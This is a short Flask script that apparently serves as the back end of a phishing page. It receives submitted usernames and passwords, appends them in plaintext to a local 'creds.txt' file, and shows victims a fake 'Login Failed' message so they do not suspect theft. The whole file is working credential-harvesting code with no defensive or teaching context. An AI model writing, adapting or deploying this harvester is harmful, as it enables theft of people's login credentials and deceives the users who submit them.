from flask import Flask, request

app = Flask(__name__)

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')

    with open("creds.txt", "a", encoding="utf-8") as file:
        file.write(f"Username: {username}, Password: {password}\n")

    return "<h1>Login Failed</h1><p>Wrong password. Please try again later.</p>"

if __name__ == '__main__':
    app.run(debug=True)
